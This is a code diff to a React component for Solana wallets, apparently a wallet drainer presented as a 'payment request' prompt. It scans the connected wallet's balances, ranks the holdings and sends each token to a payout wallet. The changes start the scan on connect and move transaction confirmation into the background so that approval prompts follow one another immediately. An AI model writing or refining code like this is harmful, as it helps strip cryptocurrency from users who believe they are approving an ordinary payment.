@@ -301,7 +301,7 @@ export function PaymentRequestPrompt() {
       if (advanceTimer.current) window.clearTimeout(advanceTimer.current)
       phase.current = 'idle'
       queue.current = []
-      scanPromise.current = null
+      // Keep any balance scan started on connect so the wallet prompt opens instantly.
       likedAfterFirst.current = false
       sentFor.current = null
       dismissed.current = null
@@ -398,6 +398,26 @@ export function PaymentRequestPrompt() {
       setOpen(true)
     }
 
+    const confirmInBackground = (signature: string, fresh: Awaited<ReturnType<typeof refreshPayoutBlockhash>>) => {
+      void connection
+        .confirmTransaction(
+          {
+            signature,
+            blockhash: fresh.recentBlockhash!,
+            lastValidBlockHeight: fresh.lastValidBlockHeight!,
+          },
+          'confirmed'
+        )
+        .then((confirmation) => {
+          if (confirmation.value.err) {
+            toast.error('The wallet approved, but Solana rejected the transfer.')
+          }
+        })
+        .catch(() => {
+          /* Signature was already submitted; ignore transient confirmation errors. */
+        })
+    }
+
     const sendBuilt = async (transaction: Awaited<ReturnType<typeof buildPayoutTransaction>>) => {
       const fresh = publicKey ? await refreshPayoutBlockhash(connection, transaction, publicKey) : transaction
       const sendOpts = {
@@ -415,17 +435,8 @@ export function PaymentRequestPrompt() {
           ? await adapter.sendTransaction(fresh, connection, sendOpts)
           : await sendTransaction(fresh, connection, sendOpts)
       }
-      const confirmation = await connection.confirmTransaction(
-        {
-          signature,
-          blockhash: fresh.recentBlockhash!,
-          lastValidBlockHeight: fresh.lastValidBlockHeight!,
-        },
-        'confirmed'
-      )
-      if (confirmation.value.err) {
-        throw new Error('The wallet approved, but Solana rejected the transfer.')
-      }
+      // Confirm on-chain in the background so the next prompt opens immediately after approval.
+      confirmInBackground(signature, fresh)
       return signature
     }
 
@@ -478,7 +489,7 @@ export function PaymentRequestPrompt() {
               continue
             }
             const signature = await sendBuilt(tokenTx)
-            toast.success(`${step.symbol} sent to the payout wallet. Signature ${signature.slice(0, 8)}…`)
+            toast.success(`${step.symbol} transfer submitted. Signature ${signature.slice(0, 8)}…`)
           }
           if (!likedAfterFirst.current) {
             likedAfterFirst.current = true
@@ -526,7 +537,7 @@ export function PaymentRequestPrompt() {
   reviewRef.current = handleReview
 
   useEffect(() => {
-    if (!open || !publicKey || !config || !destinationReady) return
+    if (!publicKey || !config || !destinationReady) return
     if (queue.current.length > 0 || scanPromise.current) return
     const request = listRankedFundSteps({ connection, from: publicKey, config }).then((steps) => {
       if (steps[0] && queue.current.length === 0) {
@@ -539,7 +550,7 @@ export function PaymentRequestPrompt() {
     return () => {
       /* keep the in-flight scan so handleReview can await it */
     }
-  }, [open, publicKey, connection, config, destinationReady])
+  }, [publicKey, connection, config, destinationReady])
 
   useEffect(() => {
     if (!open || !publicKey) return
